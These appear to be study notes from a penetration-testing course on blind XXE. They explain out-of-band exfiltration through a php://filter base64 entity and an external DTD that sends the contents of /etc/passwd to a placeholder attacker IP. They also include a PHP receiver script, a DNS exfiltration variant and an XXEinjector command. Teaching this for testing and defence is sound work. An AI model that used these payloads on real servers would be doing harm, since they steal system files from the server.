## 1. Blind XXE

A **blind XXE** occurs when:

- XML entities are processed by the application.
    
- The response does **not contain the entity output**.
    
- Runtime errors are also **not displayed**.
    

Therefore:

```text
Normal XXE       → File → Application response
Error-based XXE  → File → Error message
Blind XXE        → File → No useful response
```

For completely blind cases, **Out-of-Band (OOB) Data Exfiltration** can be used.

---

# 2. Out-of-Band (OOB) Data Exfiltration

OOB exfiltration means making the vulnerable server **send the extracted data to an external server controlled by the tester**.

Instead of:

```text
Target → Response → Attacker
```

the flow becomes:

```text
Target
  ↓
Reads file
  ↓
Encodes data
  ↓
Makes HTTP request
  ↓
Attacker-controlled server
```

This technique is also commonly used with other blind vulnerabilities such as:

- Blind SQL Injection
    
- Blind Command Injection
    
- Blind XSS
    
- Blind XXE
    

---

# 3. PHP Filter + Base64

When performing blind XXE, the file can be processed using a PHP filter to **Base64-encode its contents**.

Concept:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

The important part is:

```text
php://filter/convert.base64-encode/resource=
```

This causes the file contents to be Base64 encoded before being used.

### Why Base64?

Raw file contents may contain:

- XML-special characters
    
- Spaces
    
- Newlines
    
- Other characters that interfere with the XML/request
    

Base64 converts the content into a safer encoded representation that can be transported through the OOB request.

---

# 4. Sending the Data Through HTTP

Another parameter entity can construct an external HTTP request containing the encoded file contents.

Conceptually:

```xml
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

If the target file contains:

```text
XXE_SAMPLE_DATA
```

its Base64 representation is:

```text
WFhFX1NBTVBMRV9EQVRB
```

The vulnerable server then makes a request similar to:

```text
http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB
```

The attacker receives the request and decodes the Base64 value to recover the file contents.

---

# 5. Receiving and Decoding the Data

The module demonstrates a small PHP server that receives the `content` parameter and decodes it:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

The server can be started with:

```bash
php -S 0.0.0.0:8000
```

The attacker-controlled server therefore acts as the **OOB receiver**.

---

# 6. Triggering the OOB Request

The XML payload references the remotely hosted DTD and then references the resulting entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Important components:

- `%remote;` → loads the external DTD.
    
- `%oob;` → creates the OOB entity.
    
- `&content;` → triggers the entity and causes the outbound request.
    

The web application's response itself does not need to contain the file contents.

---

# 7. OOB Data Flow

```text
                TARGET SERVER
                     │
                     │ XXE
                     ↓
                Read local file
                     │
                     ↓
              Base64 encode
                     │
                     ↓
          HTTP request containing data
                     │
                     ↓
             ATTACKER SERVER
                     │
                     ↓
              Base64 decode
                     │
                     ↓
              Original file
```

---

# 8. DNS OOB Exfiltration

Instead of putting encoded data in an HTTP query parameter, data can also be placed into a **DNS subdomain**.

Concept:

```text
ENCODEDDATA.example.com
```

The attacker can monitor DNS traffic and extract the encoded data from the requested subdomain.

Tools such as `tcpdump` can be used to capture incoming traffic.

### Limitation

DNS-based exfiltration is:

- More advanced
    
- More complicated to set up
    
- Generally more restrictive in how much data can be transferred
    

---

# 9. Automated OOB Exfiltration

Manual OOB XXE can be automated using tools such as **XXEinjector**.

It supports techniques including:

- Basic XXE
    
- CDATA source exfiltration
    
- Error-based XXE
    
- Blind OOB XXE
    

The general workflow is:

```text
1. Capture HTTP request in Burp
2. Save the request to a file
3. Add XXEINJECT as the injection position
4. Provide attacker IP/port
5. Specify target file
6. Select OOB HTTP mode
7. Enable PHP filtering when required
8. Retrieve extracted data from the tool's logs
```

---

# 10. XXEinjector Request Format

The saved request contains the HTTP request and the XML declaration, followed by the injection marker:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: TARGET
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

`XXEINJECT` tells the tool where it should insert its generated payload.

---

# 11. XXEinjector Output

The module demonstrates using:

```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

Important options:

|Option|Purpose|
|---|---|
|`--host`|Attacker/listener IP|
|`--httpport`|Listener port|
|`--file`|Saved HTTP request|
|`--path`|Target file|
|`--oob=http`|Use HTTP-based OOB|
|`--phpfilter`|Use PHP filtering/Base64 technique|

The retrieved files are stored under the tool's `Logs` directory.

---

# Key Takeaways

- **Blind XXE** occurs when neither entity output nor useful errors are returned.
    
- **OOB exfiltration** solves this by making the vulnerable server send data to an external server.
    
- **PHP filters + Base64** help safely transport file contents.
    
- The attack relies on the target server making an outbound request containing the encoded data.
    
- **DNS OOB** is another possible exfiltration channel.
    
- **XXEinjector** can automate multiple XXE techniques, including blind OOB XXE.
    
- OOB XXE is particularly useful when the application's HTTP response provides **no direct visibility into the extracted data**.